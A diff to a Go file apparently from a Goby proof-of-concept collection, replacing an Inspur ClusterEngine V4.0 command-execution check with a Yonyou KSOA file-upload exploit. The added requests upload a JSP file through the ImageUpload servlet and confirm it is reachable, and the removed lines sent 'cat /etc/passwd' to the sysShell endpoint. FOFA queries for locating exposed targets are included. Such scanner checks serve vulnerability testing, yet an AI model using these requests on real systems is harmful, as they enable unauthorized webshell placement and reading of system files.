@@ -6,14 +6,15 @@ import (
 
 func init() {
 	expJson := `{
-  "Name": "浪潮ClusterEngineV4.0 sysShell 任意命令执行漏洞",
+  "Name": "用友时空 KSOA 文件上传漏洞",
   "Description": "",
   "Product": "",
   "Homepage": "",
   "DisclosureDate": null,
-  "Author": "",
-  "FofaQuery": "title=\"TSCEV4.0\" || product=\"Inspur-ClusterEngine\" || \"ClusterEngine\"",
-  "GobyQuery": "title=\"TSCEV4.0\" || product=\"Inspur-ClusterEngine\" || \"ClusterEngine\"",
+  "PostTime": "2023-06-20",
+  "Author": "清晨",
+  "FofaQuery": "\"productKSOA.jpg\"",
+  "GobyQuery": "\"productKSOA.jpg\"",
   "Level": "3",
   "Impact": "",
   "Recommendation": "",
@@ -30,11 +31,15 @@ func init() {
     {
       "Request": {
         "method": "POST",
-        "uri": "/sysShell",
-        "follow_redirect": true,
-        "header": {},
+        "uri": "/servlet/com.sksoft.bill.ImageUpload?filepath=/&filename=test1112.jsp",
+        "follow_redirect": false,
+        "header": {
+          "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
+          "Accept-Encoding": "gzip, deflate",
+          "Accept-Language": "zh-CN,zh;q=0.9"
+        },
         "data_type": "text",
-        "data": "op=doPlease&node=cu01&command=cat /etc/passwd"
+        "data": "testaaa"
       },
       "ResponseTest": {
         "type": "group",
@@ -51,7 +56,38 @@ func init() {
             "type": "item",
             "variable": "$body",
             "operation": "contains",
-            "value": "root:",
+            "value": "<root>",
+            "bz": ""
+          }
+        ]
+      },
+      "SetVariable": []
+    },
+    {
+      "Request": {
+        "method": "GET",
+        "uri": "/pictures/test1112.jsp",
+        "follow_redirect": false,
+        "header": {},
+        "data_type": "text",
+        "data": ""
+      },
+      "ResponseTest": {
+        "type": "group",
+        "operation": "AND",
+        "checks": [
+          {
+            "type": "item",
+            "variable": "$code",
+            "operation": "==",
+            "value": "200",
+            "bz": ""
+          },
+          {
+            "type": "item",
+            "variable": "$body",
+            "operation": "contains",
+            "value": "testaaa",
             "bz": ""
           }
         ]
@@ -107,7 +143,7 @@ func init() {
   "CVSSScore": "",
   "Translation": {
     "CN": {
-      "Name": "浪潮ClusterEngineV4.0 sysShell 任意命令执行漏洞",
+      "Name": "用友时空 KSOA 文件上传漏洞",
       "Product": "",
       "Description": "",
       "Recommendation": "",
@@ -116,7 +152,7 @@ func init() {
       "Tags": []
     },
     "EN": {
-      "Name": "tide ClusterEngineV4 sysShell rce",
+      "Name": "yonyou KSOA file upload",
       "Product": "",
       "Description": "",
       "Recommendation": "",
@@ -131,8 +167,7 @@ func init() {
     "Service": null,
     "System": null,
     "Hardware": null
-  },
-  "PostTime": "2023-06-20"
+  }
 }`
 
 	ExpManager.AddExploit(NewExploit(
